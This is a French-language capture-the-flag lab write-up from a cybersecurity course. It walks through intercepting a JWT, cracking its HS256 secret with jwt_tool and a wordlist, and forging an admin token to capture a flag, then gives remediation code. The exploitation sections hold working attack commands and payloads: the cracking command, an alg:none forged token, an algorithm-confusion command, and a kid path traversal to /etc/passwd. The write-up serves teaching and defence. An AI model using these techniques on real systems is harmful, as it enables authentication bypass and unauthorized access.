# Write-Up / JWT Privilege Escalation / Secret Key Cracking

## Résumé 

Ce rapport documente l'exploitation d'une vulnérabilité de manipulation de JSON Web Token (JWT) sur une application web. L'attaque a consisté à intercepter le JWT d'un utilisateur standard, casser hors-ligne la clé secrète HMAC-SHA256 utilisée pour signer le token, puis forger un nouveau JWT avec des privilèges administrateur pour accéder à une ressource protégée.

**Résultat** : Élévation de privilèges complète de `user` vers `admin` + capture du flag protégé.

**Flag capturé** : `Jedha{JWT_lab}`

**Sévérité** : Critique (CVSS estimé 9.1 / Authentication Bypass)

---

## 1. Contexte et environnement

### Cible
- **Application** : Lab Jedha `jwt-auth-bypass`
- **URL** : `http://10.10.3.27:3000`
- **Stack** : Node.js + Express + jsonwebtoken
- **Surface d'attaque** : API d'authentification basée sur JWT

### Credentials fournis
```
Username: user
Password: user
```

### Outils utilisés
- Burp Suite Community (proxy HTTP, Repeater, extension JWT Editor)
- jwt_tool (analyse et cracking de JWT)
- rockyou-75.txt (wordlist filtrée)
- Navigateur Firefox avec FoxyProxy

---

## 2. Comprendre les JWT / Théorie

### Qu'est-ce qu'un JWT ?

JSON Web Token (JWT) est un standard ouvert (RFC 7519) pour transmettre des informations entre un client et un serveur de manière compacte et auto-vérifiable. Très utilisé pour l'authentification dans les APIs modernes (SPAs, microservices, mobile apps).

Un JWT se compose de trois parties séparées par des points :

```
header.payload.signature
```

Exemple :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NDU0MDE5NDB9.4Ydif1d5X3QCEVX2xXP_nbkNdqfhZrIDSJkSo3srj-w
```

### Anatomie détaillée

**Header** (encodé en Base64 URL-safe) :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
- `alg` / Algorithme de signature utilisé
- `typ` / Type de token

**Payload** (encodé en Base64 URL-safe) :
```json
{
  "username": "user",
  "iat": 1745401940
}
```
- `iat` / Issued At (timestamp Unix de création)
- Custom claims / `username`, `role`, `user_id`, etc.

**Signature** :
```
HMAC-SHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

### Algorithmes de signature

| Algorithme | Type | Vulnérabilité principale |
|---|---|---|
| `HS256` | Symétrique (HMAC) | Cracking de la clé secrète si faible |
| `HS384`, `HS512` | Symétrique (HMAC) | Idem, mais plus difficile à cracker |
| `RS256` | Asymétrique (RSA) | Confusion d'algorithme (HS256 substitution) |
| `ES256` | Asymétrique (ECDSA) | Idem RS256 |
| `none` | Aucune | Token accepté sans signature (vulnérabilité historique) |

**Le point critique de HS256** : C'est un algorithme **symétrique**. La même clé sert à signer et à vérifier. Si je découvre cette clé, je peux forger n'importe quel JWT et le serveur le validera.

### Pourquoi les JWT sont sensibles

- Le payload est **encodé** (Base64), pas chiffré. Tout le monde peut le lire.
- La sécurité repose entièrement sur la **signature**.
- Si la signature est cassée (clé faible, algorithme bypassé), la sécurité s'effondre.

---

## 3. Phase de reconnaissance

### 3.1 Authentification initiale

J'ai accédé à l'application via le navigateur configuré pour passer par Burp Suite (proxy `127.0.0.1:8080`).

```
URL : http://10.10.3.27:3000
Credentials : user / user
```

Après authentification, l'application affiche une page avec un bouton "Show Flag".

### 3.2 Tentative d'accès au flag

J'ai cliqué sur "Show Flag" pour observer le comportement.

**Réponse de l'application** :
```
Access Denied
```

**Analyse** : Le bouton existe mais l'accès est refusé. Cela suggère qu'un contrôle d'autorisation est en place, probablement basé sur le rôle de l'utilisateur. Le compte `user` n'a pas les privilèges nécessaires.

**Hypothèse** : L'application stocke le rôle dans le JWT et le vérifie côté serveur. Si je peux modifier ce rôle, je peux contourner le contrôle.

### 3.3 Identification du JWT dans le trafic

Dans Burp Suite, onglet **Proxy / HTTP History**, j'ai filtré les requêtes pour identifier le JWT.

**Requête interceptée** (clic sur "Show Flag") :

```http
POST /flag HTTP/1.1
Host: 10.10.3.27:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NDU0MDE5NDB9.4Ydif1d5X3QCEVX2xXP_nbkNdqfhZrIDSJkSo3srj-w
Content-Type: application/json
Content-Length: 2

{}
```

**Observation** : Le JWT est transmis dans le header `Authorization: Bearer ...`. C'est le pattern standard d'authentification JWT.

---

## 4. Phase d'analyse / Décodage du JWT

### 4.1 Envoi de la requête vers Repeater

Clic droit sur la requête / "Send to Repeater". Cela me permet de modifier et rejouer la requête autant de fois que nécessaire sans repasser par le navigateur.

### 4.2 Installation de l'extension JWT Editor

Dans Burp Suite, onglet **Extensions / BApp Store**, j'ai installé **JSON Web Tokens** (par ozzi-).

Cette extension ajoute un onglet "JSON Web Tokens" dans Repeater qui décode automatiquement le JWT et permet de le modifier visuellement.

### 4.3 Décodage du JWT

Dans Repeater, onglet "JSON Web Tokens", l'extension affiche les trois parties décodées :

**Header** :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** :
```json
{
  "username": "user",
  "iat": 1745401940
}
```

**Signature** : `4Ydif1d5X3QCEVX2xXP_nbkNdqfhZrIDSJkSo3srj-w` (non décodable, c'est un HMAC)

### 4.4 Analyse stratégique

**Constats importants** :

1. **Algorithme HS256** / Symétrique. Si je trouve la clé secrète, je peux forger des tokens.

2. **Payload minimaliste** / Seulement `username` et `iat`. Pas de claim `role` explicite. L'application déduit donc probablement les privilèges depuis le `username` (admin vs user).

3. **Hypothèse d'exploitation** / Si je change `username` de `user` à `admin` et que je re-signe le token avec la bonne clé, le serveur me considérera comme admin.

**Plan d'attaque** :
```
1. Cracker la clé secrète HS256 hors-ligne
2. Modifier le payload (username: admin)
3. Re-signer le JWT avec la clé crackée
4. Envoyer le nouveau JWT et obtenir le flag
```

---

## 5. Phase d'exploitation / Cracking de la clé secrète

### 5.1 Pourquoi le cracking est possible

HMAC-SHA256 est cryptographiquement solide en soi. Si la clé est aléatoire et longue (256 bits minimum recommandés), elle est incassable.

**Mais** : Les développeurs utilisent souvent des clés faibles :
- Mots du dictionnaire
- Phrases mémorables
- Valeurs par défaut (`secret`, `password`, `your-256-bit-secret`)
- Constantes d'exemples copiées depuis StackOverflow

**Principe du cracking** :
1. Prendre une liste de candidats (wordlist)
2. Pour chaque mot de passe candidat :
   a. Calculer HMAC-SHA256(header + "." + payload, candidat)
   b. Comparer avec la signature du JWT
3. Si match → on a trouvé la clé

Tout est fait **hors-ligne** sans aucune interaction avec le serveur. Pas de rate limiting, pas de logs, totalement furtif.

### 5.2 Utilisation de jwt_tool

[jwt_tool](https://github.com/ticarpi/jwt_tool) est l'outil de référence pour l'analyse et l'exploitation de JWT.

**Commande de cracking** :

```bash
python jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NDU1OTYyNDV9.4Ydif1d5X3QCEVX2xXP_nbkNdqfhZrIDSJkSo3srj-w" -C -d /usr/share/wordlists/rockyou-75.txt
```

**Décomposition des options** :
- Token JWT en argument
- `-C` / Mode crack
- `-d` / Chemin vers la wordlist (rockyou-75.txt, version filtrée de rockyou.txt avec 75 caractères max)

### 5.3 Résultat du cracking

```
        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

[+] CORRECT key found: Lets you update your FunNotes and more!

You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "Lets you update your FunNotes and more!"
```

**Clé secrète identifiée** : `Lets you update your FunNotes and more!`

### 5.4 Analyse de la vulnérabilité de la clé

La clé `Lets you update your FunNotes and more!` est une phrase issue d'une documentation ou d'un exemple. Bien qu'elle fasse 40 caractères (apparemment robuste), elle se trouve dans une wordlist publique.

**Erreurs du développeur** :
- Utilisation d'une phrase non-aléatoire
- Probablement copiée depuis un exemple/tutoriel
- Réutilisation possible entre projets

---

## 6. Phase de forge / Modification et signature du JWT

### 6.1 Modification dans Burp Suite

De retour dans Burp Suite Repeater, onglet "JSON Web Tokens" :

**Modification 1 / Payload** :
```json
{
  "username": "admin",
  "iat": 1745401940
}
```
Le `username` est changé de `user` à `admin`.

**Modification 2 / Clé de signature** :
Dans le champ "Secret" de l'extension, je colle :
```
Lets you update your FunNotes and more!
```

**Modification 3 / Action** :
Sélection de **"Recalculate Signature"**. Burp recalcule la signature HMAC-SHA256 avec la nouvelle payload et la clé fournie.

### 6.2 Nouveau JWT forgé

L'extension génère le JWT modifié :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzQ1NDAxOTQwfQ.<nouvelle_signature>
```

**Décodage du nouveau payload pour vérification** :
```json
{
  "username": "admin",
  "iat": 1745401940
}
```

La signature est mathématiquement valide (calculée avec la vraie clé), donc le serveur va l'accepter.

### 6.3 Envoi de la requête forgée

**Requête finale** :

```http
POST /flag HTTP/1.1
Host: 10.10.3.27:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzQ1NDAxOTQwfQ.<nouvelle_signature>
Content-Type: application/json
Content-Length: 2

{}
```

Clic sur "Send" dans Repeater.

### 6.4 Capture du flag

**Réponse du serveur** :

```http
HTTP/1.1 200 OK
Content-Type: application/json

🪙 Flag: Jedha{JWT_lab}
```

**Succès** : Le serveur a vérifié la signature, l'a validée (calculée avec la vraie clé), a lu le payload, vu `username=admin`, et a accordé l'accès au flag.

**Flag capturé** : `Jedha{JWT_lab}`

---

## 7. Analyse de la cause racine

### 7.1 Erreur 1 / Clé secrète faible

Le développeur a utilisé une phrase devinable au lieu d'une clé cryptographiquement aléatoire.

**Bonne pratique** :
```javascript
// Mauvais
const SECRET = "Lets you update your FunNotes and more!";

// Bon
const SECRET = crypto.randomBytes(64).toString('hex');
// Génère 128 caractères hexadécimaux aléatoires (512 bits d'entropie)
```

### 7.2 Erreur 2 / Logique d'autorisation basée sur une donnée modifiable

L'application déduit le rôle (admin vs user) depuis le `username` dans le JWT. Comme le JWT est forgeable, cette logique est intrinsèquement vulnérable.

**Bonne pratique** : Stocker uniquement l'ID utilisateur dans le JWT, et vérifier les rôles côté serveur depuis la base de données à chaque requête.

```javascript
// Mauvais
if (jwt.payload.username === "admin") {
    grantAccess();
}

// Bon
const user = await db.users.findById(jwt.payload.user_id);
if (user.role === "admin") {
    grantAccess();
}
```

### 7.3 Erreur 3 / Pas de vérification de l'expiration

Le payload du JWT ne contient pas de claim `exp` (expiration). Le token est donc valide indéfiniment, ce qui aggrave l'impact si une clé fuite ou est compromise.

---

## 8. Recommandations de remédiation

### Solution 1 / Génération de clé robuste

```javascript
const crypto = require('crypto');

// Générer une clé secrète robuste
const SECRET_KEY = crypto.randomBytes(64).toString('hex');

// Stocker dans une variable d'environnement, JAMAIS dans le code source
// .env file:
// JWT_SECRET=a1b2c3d4...

const jwt = require('jsonwebtoken');
const token = jwt.sign(payload, process.env.JWT_SECRET, {
    algorithm: 'HS256',
    expiresIn: '1h'
});
```

### Solution 2 / Utilisation d'algorithmes asymétriques

Pour les applications critiques, utiliser RS256 ou ES256 (asymétriques). Le serveur signe avec une clé privée, mais la vérification utilise une clé publique. Même si la clé publique fuite, on ne peut pas forger de tokens.

```javascript
const privateKey = fs.readFileSync('private.key');
const publicKey = fs.readFileSync('public.key');

// Signature (côté serveur uniquement)
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });

// Vérification (peut être faite par d'autres services avec la clé publique)
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### Solution 3 / Vérification stricte des claims

```javascript
jwt.verify(token, SECRET_KEY, {
    algorithms: ['HS256'],       // Forcer l'algorithme (anti algorithm confusion)
    issuer: 'my-app',            // Vérifier l'émetteur
    audience: 'my-app-users',    // Vérifier le destinataire
    maxAge: '1h'                 // Forcer une durée de vie max
});
```

### Solution 4 / Autorisation côté serveur

```javascript
app.post('/flag', authenticateJWT, async (req, res) => {
    // Ne JAMAIS faire confiance aux claims du JWT pour l'autorisation
    const userId = req.jwt.payload.user_id;
    
    // Vérifier le rôle en base
    const user = await db.users.findById(userId);
    if (!user || user.role !== 'admin') {
        return res.status(403).json({ error: 'Access Denied' });
    }
    
    res.json({ flag: 'Jedha{JWT_lab}' });
});
```

### Solution 5 / Rotation et révocation

- Implémenter une liste de tokens révoqués (blocklist) côté serveur
- Utiliser des tokens de courte durée + refresh tokens
- Rotation périodique de la clé secrète

---

## 9. Autres vecteurs d'attaque JWT (pour aller plus loin)

### Attack 1 / alg: none

Certaines bibliothèques mal configurées acceptent un JWT signé avec `alg: none` :

```
Header modifié : {"alg":"none","typ":"JWT"}
Encodé : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

JWT forgé final (signature vide) :
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```

### Attack 2 / Algorithm Confusion (RS256 → HS256)

Si l'application utilise RS256, l'attaquant peut tenter de forger un JWT en HS256 en utilisant la **clé publique** comme secret HMAC. Certaines bibliothèques font la confusion et acceptent le token.

```bash
python jwt_tool.py "<token>" -X k -pk public.pem
```

### Attack 3 / Kid Injection

Le claim `kid` (Key ID) peut être manipulé pour pointer vers un fichier arbitraire utilisé comme secret :

```json
{"alg":"HS256","kid":"../../../../../etc/passwd"}
```

Si le serveur utilise `kid` pour charger la clé, on peut le forcer à utiliser le contenu d'un fichier connu comme secret.

### Attack 4 / JKU et X5U Manipulation

Les claims `jku` et `x5u` permettent de spécifier l'URL d'une clé publique. Si non validés, l'attaquant peut héberger sa propre clé et forger des tokens.

---

## 10. Compétences démontrées

### Sécurité offensive
- Analyse et décodage de JWT
- Identification d'algorithmes de signature et leurs faiblesses
- Cracking hors-ligne de clés HMAC-SHA256
- Forge de tokens d'authentification
- Élévation de privilèges (user → admin)
- Compréhension de la chaîne d'authentification web moderne

### Outils et technologies
- Burp Suite (proxy, Repeater, extension JWT Editor)
- jwt_tool (analyse et cracking JWT)
- Wordlists (rockyou-75.txt)
- HMAC-SHA256 et cryptographie symétrique
- Base64 URL-safe encoding

### Méthodologie
- Reconnaissance du flux d'authentification
- Identification des claims sensibles
- Cracking offline (furtif, sans interaction serveur)
- Analyse de causes racines (clé faible + logique d'autorisation)
- Recommandations de remédiation multi-niveaux

---

## 11. Chaîne d'attaque complète résumée

```
1. Reconnaissance
   Connexion avec user/user
   Test du bouton "Show Flag" → "Access Denied"
   Hypothèse : contrôle d'autorisation basé sur le rôle

2. Interception du JWT
   Burp Suite intercepte POST /flag
   JWT identifié dans Authorization: Bearer ...
   Envoi vers Repeater

3. Analyse du JWT
   Installation extension JSON Web Tokens
   Décodage : alg HS256, payload {username:"user"}
   Constat : algo symétrique → cracking possible

4. Cracking offline
   jwt_tool -C -d rockyou-75.txt
   Clé trouvée : "Lets you update your FunNotes and more!"

5. Forge du token
   Modification payload : username "user" → "admin"
   Recalculate Signature avec la clé crackée
   Nouveau JWT forgé et valide

6. Exploitation
   Envoi de la requête avec le JWT forgé
   Réponse : 200 OK + flag

Flag capturé : Jedha{JWT_lab}
```

---

## 12. Comparaison avec les autres vulnérabilités du portfolio

| Vulnérabilité | Type | Impact | Difficulté |
|---|---|---|---|
| SQLi (DVWA Medium) | Injection | Exfiltration données | Moyenne |
| XSS Reflected (DVWA Medium) | Injection | Session hijacking | Faible |
| SSTI Jinja2 | Injection | RCE complète | Moyenne-Élevée |
| JWT Privilege Escalation (ce write-up) | Authentication Bypass | Élévation de privilèges | Moyenne |

La vulnérabilité JWT illustre une catégorie distincte : ce n'est pas une injection, c'est une **faiblesse cryptographique combinée à une logique d'autorisation défaillante**. Elle nécessite une compréhension de la cryptographie symétrique et des standards d'authentification modernes.

---

## 13. Ressources et références

- **RFC 7519 (JWT specification)** : https://tools.ietf.org/html/rfc7519
- **OWASP JWT Cheat Sheet** : https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- **PortSwigger JWT Labs** : https://portswigger.net/web-security/jwt
- **jwt_tool GitHub** : https://github.com/ticarpi/jwt_tool
- **jwt.io Debugger** : https://jwt.io/
- **HackTricks JWT** : https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- **PayloadsAllTheThings JSON Web Token** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token

---

*Write-up rédigé lors de la formation Jedha Cybersécurité / Fullstack RNCP Niveau 6*
